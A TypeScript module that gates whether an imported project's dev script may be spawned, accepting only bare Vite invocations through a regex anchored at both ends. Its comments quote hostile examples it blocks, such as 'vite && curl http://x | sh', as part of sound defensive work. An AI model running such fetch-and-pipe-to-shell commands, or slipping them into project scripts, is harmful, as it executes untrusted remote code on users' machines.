/**
 * liveCapability — can this project's real app actually be RUN by Studio,
 * and if not, why not, in one word the UI can say out loud.
 *
 * Two consumers, one answer:
 *   - the `Static · Live` pill in the canvas chrome, which has to say which
 *     runtime the user is looking at, and — for a project that can never go
 *     live — say why instead of claiming "Live" over a static fallback;
 *   - `devServer.ts`'s spawner, which refuses to start anything this says it
 *     cannot frame. That is the gate that matters: every project is Tier 2
 *     by default (`DEFAULT_TRUST_TIER`) and the canvas prewarms the dev
 *     server on mount, so without it any imported repository's `dev`/`start`
 *     script — `next dev`, `node server.js`, `curl … | sh` — would run on
 *     first open whether or not Studio could do anything with the result
 *     (`sec-20`).
 *
 * ## The one condition: the script Studio would run is `vite`
 *
 * Running the app means spawning its dev server and framing it
 * (`devServer.ts` + `server/liveOrigin.ts`), and the whole live path — the
 * `virtual:studio-runtime` module, the `data-node-id` stamping plugin, the
 * `/p/<projectKey>/` base path — is a Vite plugin. So the rule is stated on
 * the one thing that will actually execute: the `dev` (else `start`) script
 * in `package.json` must invoke `vite`, optionally through a runner
 * (`npx vite`, `bunx vite --port 4000`). Anything else is `not-vite` — the
 * pill says "Live needs Vite", the spawner never spawns. A Next/CRA project
 * is not "unsupported forever", it is §6 decision 5: deferred.
 *
 * Deliberately NOT the probed `framework`, and NOT "has a `vite.config`":
 * Studio's own shell scaffold writes a `vite.config.js` into every project
 * it opens, so a config-shaped rule would be satisfied by Studio itself; and
 * the cached profile can lag (a project probed before the shell existed says
 * `unknown` for good). The script text is what runs; judge that.
 *
 * ## The second condition: Vite is installed
 *
 * A vite script with no `node_modules/vite` cannot boot: the dev server dies
 * with "Vite is not installed" and the board stays on Studio's static render.
 * Reporting that as `capable: true` made the pill say "Live" over a render
 * that was not live. It is reported as `not-installed` instead, so the pill
 * names the real state and offers the Dependencies panel as the one-click fix.
 * Deliberately NOT a lockfile check: a lockfile says the project WAS installed,
 * not that `node_modules` is there now.
 */
import { existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { resolveAppRoot } from './appRoot'

export type LiveBlockedReason = 'not-vite' | 'not-installed'

export interface LiveCapability {
  /** The real app can be run and framed: its dev script is a `vite` invocation. */
  capable: boolean
  /** Why not, when `capable` is false. Absent when it is true. */
  reason?: LiveBlockedReason
}

/** The script `devServer.ts` would run: `dev` when present, else `start`. */
export interface DevScript {
  name: 'dev' | 'start'
  command: string
}

/** Reads `package.json` at `appRoot` and picks the script a dev server would run. `null` when there is none. Never throws. */
export function resolveDevScript(appRoot: string): DevScript | null {
  const pkgPath = join(appRoot, 'package.json')
  if (!existsSync(pkgPath)) return null
  try {
    const parsed: unknown = JSON.parse(readFileSync(pkgPath, 'utf8'))
    if (!parsed || typeof parsed !== 'object') return null
    const scripts = (parsed as Record<string, unknown>).scripts
    if (!scripts || typeof scripts !== 'object') return null
    const map = scripts as Record<string, unknown>
    if (typeof map.dev === 'string') return { name: 'dev', command: map.dev }
    if (typeof map.start === 'string') return { name: 'start', command: map.start }
    return null
  } catch {
    return null
  }
}

/**
 * `vite`, `vite dev --port 4000`, `npx vite`, `bunx vite --host 127.0.0.1`,
 * `pnpm exec vite`, `yarn vite` — and nothing else. Anchored at BOTH ends:
 * `npm run` hands the whole script string to a shell, so a rule that only
 * checked the start would have run `vite && curl http://x | sh` (`sec-21`).
 * Everything after the `vite` token has to be a bounded flag/argument token —
 * letters, digits, `_ . / : = -` — which admits every real Vite flag and no
 * shell metacharacter: no `; & | < >`, no quotes, no backticks, no `$(`.
 * Running `vite` still evaluates the project's own `vite.config.*`; that is
 * what Tier 2 means, not a gap this rule pretends to close.
 */
const VITE_INVOCATION = /^\s*(?:(?:npx|bunx|pnpm|yarn)\s+(?:exec\s+)?)?vite(?:\s+[\w./:=-]+)*\s*$/

export function resolveLiveCapability(dir: string): LiveCapability {
  const appRoot = resolveAppRoot(dir)
  const script = resolveDevScript(appRoot)
  if (!script || !VITE_INVOCATION.test(script.command)) return { capable: false, reason: 'not-vite' }
  // The app root, or the project root for a hoisted workspace install.
  const viteInstalled = [appRoot, dir].some((root) => existsSync(join(root, 'node_modules', 'vite', 'package.json')))
  if (!viteInstalled) return { capable: false, reason: 'not-installed' }
  return { capable: true }
}

/**
 * One sentence per refusal, so the log and the console say what is actually
 * wrong. Every reason used to be reported as "the script is not a vite
 * invocation" - which told the owner of a plain `"dev": "vite"` project with no
 * `node_modules` that their script was the problem. No filesystem path: this
 * text reaches the client.
 */
export function describeLiveRefusal(dir: string, reason: LiveBlockedReason): string {
  if (reason === 'not-installed') {
    return 'Live needs an install: Vite is not installed in this project (there is no node_modules/vite), so its dev server cannot start. Install the dependencies from the Dependencies panel.'
  }
  if (!resolveDevScript(resolveAppRoot(dir))) {
    return 'Live needs a dev script: package.json has no "dev" or "start" script, so there is nothing for Studio to run.'
  }
  return "Live needs Vite: this project's dev/start script is not a vite invocation, so Studio does not run it."
}
